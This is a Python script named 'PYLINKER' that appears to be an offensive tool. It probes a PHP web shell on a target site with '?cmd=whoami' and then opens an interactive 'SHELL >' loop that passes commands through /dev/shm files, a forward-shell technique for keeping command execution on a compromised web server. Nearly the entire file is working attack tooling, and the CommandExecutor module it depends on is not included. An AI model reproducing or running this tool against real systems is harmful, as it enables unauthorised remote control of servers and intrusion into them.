#!/usr/bin/env python3

import signal
import sys
import time
import requests
from random import randrange
from command_in import CommandExecutor
from termcolor import colored
from urllib.parse import urlparse

banner ="""
██████╗ ██╗   ██╗██╗     ██╗███╗   ██╗██╗  ██╗███████╗██████╗ 
██╔══██╗╚██╗ ██╔╝██║     ██║████╗  ██║██║ ██╔╝██╔════╝██╔══██╗
██████╔╝ ╚████╔╝ ██║     ██║██╔██╗ ██║█████╔╝ █████╗  ██████╔╝
██╔═══╝   ╚██╔╝  ██║     ██║██║╚██╗██║██╔═██╗ ██╔══╝  ██╔══██╗
██║        ██║   ███████╗██║██║ ╚████║██║  ██╗███████╗██║  ██║
╚═╝        ╚═╝   ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

BY: Arnaldo Cairo
"""
print("\n" + banner + "\n")

def handle_signal(sig, frame):
    print(colored("\n\n[*] Closing", "red"))
    command_in.run_command(remove_input_cmd)
    command_in.run_command(remove_output_cmd)
    sys.exit(1)

# Global variables
session = randrange(1000, 9999)
input_file = f"/dev/shm/input.{session}"
output_file = f"/dev/shm/output.{session}"
remove_input_cmd = f"/bin/rm {input_file}"
remove_output_cmd = f"/bin/rm {output_file}"
print(colored("\n[*] If you want to exit, type 'exit'", 'yellow'))

weburl = input("\n[+] Enter the full URL: ").strip()
print("")

if weburl.lower() == 'exit':
    print(colored("\n[*] Thanks for Your Use", "yellow"))
    exit(0)

parsed_url = urlparse(weburl)
if parsed_url.scheme not in ['http', 'https'] or not parsed_url.netloc or '.php' not in parsed_url.path:
    print(colored("\n[-] Invalid URL format", "red"))
    exit(1)

try:
    response = requests.get(url=weburl+'?cmd=whoami')
    response.raise_for_status()
    if response.status_code == 404:
        print(colored("\n[-] The specified PHP file on the web is incorrect", "red"))
        exit(1)
except requests.RequestException:
    print(colored(f"\n[-] Error connecting to the URL", "red"))
    exit(1)

command_in = CommandExecutor(weburl=weburl, output_file=output_file)
command_in.setup_shell()
signal.signal(signal.SIGINT, handle_signal)

while True:
    user_input = input(colored("SHELL > ", "yellow"))
    command_in.write_command(user_input + "\n")
    time.sleep(1)
